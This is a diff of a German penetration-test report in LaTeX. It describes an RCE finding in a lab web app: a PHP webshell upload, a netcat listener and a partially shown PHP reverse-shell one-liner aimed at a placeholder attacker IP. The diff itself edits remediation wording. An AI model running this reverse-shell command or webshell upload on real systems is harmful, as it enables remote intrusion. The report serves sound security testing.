@@ -63,20 +63,20 @@ Der Angreifer kann nun einen neuen Block-Eintrag erstellen und den folgenden Jav
 
 \subsection*{Empfehlungen}
 \begin{itemize}
-    \item Eingabevalidierung: Validieren und Escapen sie alle Nutzereingaben, um Injection Angriffe zu verhindern (Siehe \cite{owaspInputValidation}).
-    \item Sichere Session-Cookies: Setzen sie HTTP-Only Cookies für die SessionIDs, damit diese nicht durch clientseitigen JavaScript Code ausgelesen werden können (Siehe \cite{owaspSessionManagement}).
+    \item Eingabevalidierung: Validieren und escapen Sie alle Benutzereingaben, um Injection-Angriffe zu verhindern (siehe \cite{owaspInputValidation}).
+    \item Sichere Session-Cookies: Setzen Sie das HTTP-Only-Flag für Cookies für die Session-IDs, damit diese nicht durch clientseitiges JavaScript ausgelesen werden können (siehe \cite{owaspSessionManagement}).
 \end{itemize}
 
 
 
 \cvss{av=network, ac=low, pr=none, ui=required, s=changed, c=high, i=high, a=high}
-\cvssdescription{Lorem ipsum dolor sit amet.}
+\cvssdescription{Ein unsichere Dateiupload in Verbindung mit schwachen Zugriffsrechten auf hochgeladene Dateien ermöglichen den Upload einer Webshell, welche zum Erstellen einer Reverse Shell genutzt werden kann.}
 
 \section{\makecvssbadge Remote Code Execution (RCE)}
 \cvssaddtosummary{Pediküre Salon Stolzfuß: Remote Code Execution (RCE)}
 
 \subsection*{Proof of Concept}
-Dieser Benutzer \textit{Odo} hat Entwicklerrechte für die Webanwendung und kann Konfigurationen an der Webanwendung vornehmen. Unter der Adresse \url{http://10.0.68.101:80/} können die Felder zum Erstellen eines Blogeintrags geändert werden. Es kann ein Datei-Upload-Feld hinzugefügt werden, das das Hochladen von PHP-Dateien ermöglicht. PHP-Dateien müssen explizit als gültiges Datenformat in die Validierungsregeln aufgenommen werden. Dadurch kann ein Blogeintrag erstellt werden, an den eine PHP-Webshell angehängt wird (Siehe \autoref{listing:php-webshell}). Der Angreifer kann mit dem Befehl in \autoref{listing:netcat-listener} einen Netcat-Listener starten und anschließend in der Web-Shell mit dem Befehl in \autoref{listing:pedikuere:revers_shell} eine Reverse Shell starten. Ein Nachweis ist in \autoref{fig:01_pedikuere_salon_proof} dargestellt.
+Dieser Benutzer \textit{Odo} hat Entwicklerrechte für die Webanwendung und kann Konfigurationen an der Webanwendung vornehmen. Unter der Adresse \url{http://10.0.68.101:80/} können die Felder zum Erstellen eines Blogeintrags geändert werden. Es kann ein Datei-Upload-Feld hinzugefügt werden, das das Hochladen von PHP-Dateien ermöglicht. PHP-Dateien müssen explizit als gültiges Datenformat in die Validierungsregeln aufgenommen werden. Dadurch kann ein Blogeintrag erstellt werden, an den eine PHP-Webshell angehängt wird (siehe \autoref{listing:php-webshell}). Der Angreifer kann mit dem Befehl in \autoref{listing:netcat-listener} einen Netcat-Listener starten und anschließend in der Web-Shell mit dem Befehl in \autoref{listing:pedikuere:revers_shell} eine Reverse Shell starten. Ein Nachweis ist in \autoref{fig:01_pedikuere_salon_proof} dargestellt.
 
 \begin{listing}[!ht]
 \begin{minted}{bash}
@@ -113,7 +113,7 @@ php -r '\$sock=fsockopen("<Angreifer-IP>",9001);exec("/bin/sh -i <\&3 >\&3 2>\&3
 
 \subsection*{Empfehlungen}
 \begin{itemize}
-    \item Sichere Dateiuploads: Upload-Verzeichnisse sollten so konfiguriert werden, dass darin hochgeladene Dateien nicht als PHP-Code ausgeführt werden können (z.B. durch entsprechende Serverkonfiguration oder mittels .htaccess-Regeln) (Siehe \cite{owaspFileUpload}).
+    \item Sichere Dateiuploads: Upload-Verzeichnisse sollten so konfiguriert werden, dass darin hochgeladene Dateien nicht als PHP-Code ausgeführt werden können (z.B. durch entsprechende Serverkonfiguration oder mittels .htaccess-Regeln) (siehe \cite{owaspFileUpload}).
 \end{itemize}
 
 
